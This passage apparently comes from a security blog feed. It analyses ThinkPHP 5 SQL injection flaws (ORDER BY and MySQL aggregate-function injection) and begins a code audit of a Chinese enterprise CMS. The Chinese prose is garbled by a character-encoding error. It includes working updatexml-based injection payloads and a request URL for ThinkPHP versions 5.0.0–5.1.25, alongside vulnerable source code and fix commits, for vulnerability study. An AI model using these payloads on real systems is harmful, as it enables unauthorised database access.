class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span>(<span class="params">Query $query, $order</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;[rand]&#x27;</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">&#x27; &#x27;</span>, strpos($val, <span class="string">&#x27; &#x27;</span>) ? $val : $val . <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">&#x27;ASC&#x27;</span>, <span class="string">&#x27;DESC&#x27;</span>], <span class="literal">true</span>) ? <span class="string">&#x27; &#x27;</span> . $sort : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="literal">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; ORDER BY &#x27;</span> . implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„å‡½æ•°ä¸­ï¼Œ<code>$order</code> å³æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ï¼Œç„¶åç»è¿‡äº†<code>parseKey</code> æ–¹æ³•å¤„ç†åè¿”å›ç»™<code>$array</code>ã€‚</p><p>è·Ÿè¿›æŸ¥çœ‹è¯¥æ–¹æ³•çš„å®ç°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233128.png" alt="image-20200915231942203"></p><p>è¯¥æ–¹æ³•åœ¨å˜é‡<code>$key</code> çš„ä¸¤ç«¯æ·»åŠ äº†åå¼•å·è¿›è¡Œæ‹¼æ¥ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ã€‚å†å’Œç²¾å¿ƒæ„é€ å¥½çš„Payload ç»“åˆå</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233201.png" alt="image-20200915230823430"></p><p>æœ€ç»ˆè¿”å›äº†ä¸€ä¸ªå¸¦æœ‰<code>ORDER BY</code> çš„ SQL æ³¨å…¥ payload ç»™è¦æ‰§è¡Œçš„SQLè¯­å¥ï¼Œå®ç°<code>ORDER BY</code> æ³¨å…¥ã€‚</p><h2 id="åˆ©ç”¨æ€»ç»“-4"><a href="#åˆ©ç”¨æ€»ç»“-4" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233944.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-4"><a href="#æ¼æ´ä¿®å¤-4" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190</a></p><h1 id="SQLæ³¨å…¥å…­-Mysqlèšåˆå‡½æ•°æ³¨å…¥"><a href="#SQLæ³¨å…¥å…­-Mysqlèšåˆå‡½æ•°æ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥å…­(Mysqlèšåˆå‡½æ•°æ³¨å…¥)"></a>SQLæ³¨å…¥å…­(Mysqlèšåˆå‡½æ•°æ³¨å…¥)</h1><h2 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h2><p>ä¸åŒç‰ˆæœ¬ <strong>payload</strong> éœ€ç¨ä½œè°ƒæ•´ï¼š</p><p><strong>5.0.0~5.0.21</strong> ã€ <strong>5.1.3ï½5.1.10</strong> ï¼š <strong>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p><strong>5.1.11ï½5.1.25</strong> ï¼š <strong>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p>è¿™é‡Œä»¥<code>5.1.25</code> ç‰ˆæœ¬çš„ThinkPHP è¿›è¡Œæ¼æ´åˆ†æã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?options&#x3D;id&#96;)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916003016.png" alt="image-20200916003000509"></p><h2 id="å½±å“ç‰ˆæœ¬-5"><a href="#å½±å“ç‰ˆæœ¬-5" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p> <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> ã€ <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> </p><h2 id="æ¼æ´æ¦‚è¿°-5"><a href="#æ¼æ´æ¦‚è¿°-5" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äºæ‰€æœ‰ <strong>Mysql</strong> èšåˆå‡½æ•°ç›¸å…³æ–¹æ³•ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-5"><a href="#æ¼æ´åˆ†æ-5" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å’Œä¹‹å‰çš„åˆ†ææ€è·¯ä¸€æ ·ï¼Œå…ˆå»Github ä¸Šæ‰¾æ›´æ–°ç‰ˆæœ¬çš„commit è®°å½•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916004546.png" alt="image-20200916003529194"></p><p><a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p><p>æ–°å¢åŠ äº†ä¸€æ¡<code>if</code> åˆ¤æ–­ è¯­å¥ï¼Œç”¨æ¥æŠ›å‡ºå¼‚å¸¸ã€‚</p><p>å’Œå‰å‡ ä¸ªThinkPHP 5 SQL æ³¨å…¥æ¼æ´ä¸€æ ·ï¼Œç¨‹åºéƒ½ä¼šè¿›å…¥åˆ°<code>Query</code> ç±»ä¸­ï¼Œæ­¤å¤„åœ¨<code>../application/index/controller/index.php</code> ä¸­ï¼Œæ¨¡æ‹Ÿçš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = request()-&gt;get(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        $result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;max($options);</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤ä¼šå…ˆè¿›å…¥åˆ°<code>Query</code>ç±» çš„ <code>max</code> æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014143.png" alt="image-20200916010724376"></p><p>ç”¨æˆ·çš„è¾“å…¥ä¼ ç»™äº†<code>field</code> ï¼šid`)+updatexml(1,concat(0x7,user(),0x7e),1) from users#</p><p>ç„¶åè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº†<code>aggregate</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥ç€è°ƒç”¨äº†<code>$this-&gt;connection</code> çš„ <code>aggregate</code>æ–¹æ³•ï¼Œè€Œ<code>$this-&gt;connection</code> ä¸º<code>think\db\connector\Mysql</code> ç±»ï¼Œè€Œ<code>Mysql</code>ç±»ç»§æ‰¿ä¸<code>Connection</code> ç±»ï¼Œæ•…è°ƒç”¨è¯¥ç±»çš„<code>aggregate</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº†<code>$this-&gt;builder</code>ï¼Œæ­¤å¤„ä¸º<code>think\db\Builder\Mysql</code> ç±»çš„ <code>parseKey</code> æ–¹æ³•ã€‚è¯¥æ–¹æ³•å’ŒSQLæ³¨å…¥äº”èµ·åˆ°çš„ä½œç”¨ä¸€æ ·ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014123.png" alt="image-20200916012332355"></p><p>ç†æ¸…äº†è°ƒç”¨æƒ…å†µã€‚å…·ä½“è¯´<code>parseKey</code>æ–¹æ³•çš„ä½œç”¨</p><blockquote><p><strong>parseKey</strong> æ–¹æ³•ä¸»è¦æ˜¯å¯¹å­—æ®µå’Œè¡¨åè¿›è¡Œå¤„ç†ï¼Œè¿™é‡Œåªæ˜¯å¯¹æˆ‘ä»¬çš„æ•°æ®ä¸¤ç«¯éƒ½æ·»åŠ äº†åå¼•å·ã€‚ç»è¿‡ <strong>parseKey</strong> æ–¹æ³•å¤„ç†åï¼Œç¨‹åºåˆå›åˆ°äº†ä¸Šå›¾çš„ <strong>$this-&gt;value()</strong> æ–¹æ³•ä¸­ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨ <strong>Builder</strong> ç±»çš„ <strong>select</strong> æ–¹æ³•æ¥æ„é€  <strong>SQL</strong> è¯­å¥ã€‚è¿™ä¸ªæ–¹æ³•åº”è¯¥è¯´æ˜¯åœ¨åˆ†æ <strong>ThinkPHP</strong> æ¼æ´æ—¶ï¼Œéå¸¸å¸¸è§çš„äº†ã€‚å…¶æ— éå°±æ˜¯ä½¿ç”¨ <strong>str_replace</strong> æ–¹æ³•ï¼Œå°†å˜é‡æ›¿æ¢åˆ° <strong>SQL</strong> è¯­å¥æ¨¡æ¿ä¸­ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ <strong>parseField</strong> æ–¹æ³•ï¼Œå› ä¸ºç”¨æˆ·å¯æ§æ•°æ®å­˜å‚¨åœ¨ <strong>$options[â€˜fieldâ€™]</strong> å˜é‡ä¸­å¹¶è¢«ä¼ å…¥è¯¥æ–¹æ³•ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>parseFieid</code>æ–¹æ³•ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseField</span>(<span class="params">Query $query, $fields</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == $fields || <span class="keyword">empty</span>($fields)) &#123;</span><br><span class="line">        $fieldsStr = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_array($fields)) &#123;</span><br><span class="line">        <span class="comment">// æ”¯æŒ &#x27;field1&#x27;=&gt;&#x27;field2&#x27; è¿™æ ·çš„å­—æ®µåˆ«åå®šä¹‰</span></span><br><span class="line">        $array = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($fields <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($key)) &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key) . <span class="string">&#x27; AS &#x27;</span> . <span class="keyword">$this</span>-&gt;parseKey($query, $field, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $fieldsStr = implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $fieldsStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•æœªåšä»»ä½•è¿‡æ»¤ï¼Œç”¨æˆ·å¯æ§æ•°æ®åªæ˜¯ç»è¿‡ <strong>parseKey</strong> æ–¹æ³•å¤„ç†ï¼Œå¹¶ä¸å½±å“æ•°æ®ï¼Œç„¶åç›´æ¥ç”¨é€—å·æ‹¼æ¥ï¼Œæœ€ç»ˆç›´æ¥æ›¿æ¢è¿› <strong>SQL</strong> è¯­å¥æ¨¡æ¿é‡Œï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„å‘ç”Ÿ</p><h2 id="åˆ©ç”¨æ€»ç»“-5"><a href="#åˆ©ç”¨æ€»ç»“-5" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://github.com/Ifonly-go2019/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/7.png" alt="7"></p><h2 id="æ¼æ´ä¿®å¤-5"><a href="#æ¼æ´ä¿®å¤-5" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼šå½“åŒ¹é…åˆ°é™¤äº† <strong>å­—æ¯ã€ç‚¹å·ã€æ˜Ÿå·</strong> ä»¥å¤–çš„å­—ç¬¦æ—¶ï¼Œå°±æŠ›å‡ºå¼‚å¸¸ã€‚</p><p> <img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç¯å¢ƒå‡†å¤‡ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="SQLæ³¨å…¥" scheme="https://hack-for.fun/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>æ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»Ÿä»£ç å®¡è®¡å­¦ä¹ (å¤ç°)</title>
    <link href="https://hack-for.fun/844d1b07.html"/>
    <id>https://hack-for.fun/844d1b07.html</id>
    <published>2020-09-12T01:19:38.000Z</published>
    <updated>2020-09-12T10:49:37.659Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://v0w.top/2020/08/26/CodeAudit-php/">ä»£ç å®¡è®¡å¸¸è§çš„ä¸‰ç§æ–¹æ³•ï¼ˆPHPç¯‡ï¼‰</a></p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-1">PHPä»£ç å®¡è®¡åˆæ¬¡å°è¯•ä¹‹æ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»Ÿ</a></p><p>å®¡è®¡æ€è·¯é€šè¿‡è„‘å›¾å¤§æ¦‚æ€»ç»“å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912095326.png" alt="image-20200912095322738"></p><h1 id="äº†è§£ç³»ç»Ÿ"><a href="#äº†è§£ç³»ç»Ÿ" class="headerlink" title="äº†è§£ç³»ç»Ÿ"></a>äº†è§£ç³»ç»Ÿ</h1><p><strong>CMSåç§°</strong>ï¼šæ–°ç§€ä¼ä¸šç½‘ç«™ç³»ç»ŸPHPç‰ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183413.png" alt="image-20200912095625466"></p><p>çœ‹ç€ç•Œé¢å°±çŸ¥é“æ˜¯ç”¨äºä¼ä¸šæ‰“å¹¿å‘Š(x)å’Œå‘å¸ƒä¿¡æ¯ï¼Œæ‹›è˜ç­‰åŠŸèƒ½çš„ç³»ç»Ÿã€‚ä¸”å­˜åœ¨å‰å°ç”¨æˆ·ç™»å½•å’Œåå°ç®¡ç†ç³»ç»Ÿã€‚å­˜åœ¨æœç´¢åŠŸèƒ½ã€‚</p><h1 id="é˜²æŠ¤ç­–ç•¥"><a href="#é˜²æŠ¤ç­–ç•¥" class="headerlink" title="é˜²æŠ¤ç­–ç•¥"></a>é˜²æŠ¤ç­–ç•¥</h1><h2 id="IPç™»å½•é™åˆ¶-çŒœæµ‹ä¼ªé€ IPæ³¨å…¥"><a href="#IPç™»å½•é™åˆ¶-çŒœæµ‹ä¼ªé€ IPæ³¨å…¥" class="headerlink" title="IPç™»å½•é™åˆ¶ - çŒœæµ‹ä¼ªé€ IPæ³¨å…¥"></a>IPç™»å½•é™åˆ¶ - çŒœæµ‹ä¼ªé€ IPæ³¨å…¥</h2><p>é™åˆ¶äº†å‰å°ã€åå°çš„ç™»å½•æ¬¡æ•°é™åˆ¶ã€æ³¨å†Œé™åˆ¶ã€å¯èƒ½ä¼šå½±å“åˆ°åé¢SQLæ³¨å…¥æ¼æ´çš„æµ‹è¯•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183349.png" alt="image-20200912100248513"></p><p>å¯èƒ½å‡ºç°çš„æ¼æ´ï¼š<strong>ä¼ªé€ IPè¿›è¡Œæ³¨å…¥æ”»å‡»</strong></p><p>æ•°æ®åº“ç›‘æ§ï¼Œåœ¨æ³¨å†Œçš„åœ°æ–¹çœ‹çœ‹<code>ip</code> æ˜¯å¦è¢«å¸¦å…¥äº†æ•°æ®åº“ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184550.png" alt="image-20200912102325325"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from php_shisiusafe where saf_ip &#x3D; &#39;127.0.0.1&#39;  and saf_action &#x3D; &#39;register&#39;</span><br></pre></td></tr></table></figure><p>å…¨å±€å®šä½åˆ°è·å–ç”¨æˆ·iPçš„ä»£ç éƒ¨åˆ†ï¼š</p><p>phpstorm æœç´¢ è·å–IPï¼Œå³å¯ã€‚</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–å®¢æˆ·ç«¯IP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$ip)))</span><br><span class="line">&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œå½“ip é™¤å»<code>.</code>  åï¼Œå¦‚æœä¸æ˜¯çº¯æ•°å­—ï¼Œé‚£ä¹ˆå°±è®¾ç½®ä¸º 0.0.0.0 ã€‚å› æ­¤é€šè¿‡ä¼ªé€ IPè¿›è¡Œæ³¨å…¥æ˜¯è¡Œä¸é€šäº†ã€‚</p><h2 id="XSS-è¿‡æ»¤"><a href="#XSS-è¿‡æ»¤" class="headerlink" title="XSS è¿‡æ»¤"></a>XSS è¿‡æ»¤</h2><p>å‰å°å­˜åœ¨ç•™è¨€åŠŸèƒ½ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184533.png" alt="image-20200912103732317"></p><p>æäº¤åï¼Œæˆ‘ä»¬ç™»å½•åå°ç®¡ç†å‘˜è¿›è¡ŒæŸ¥çœ‹ç•™è¨€å†…å®¹ã€‚ å‘ç°å¹¶æ²¡æœ‰æ‰§è¡Œjsä»£ç ã€‚</p><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 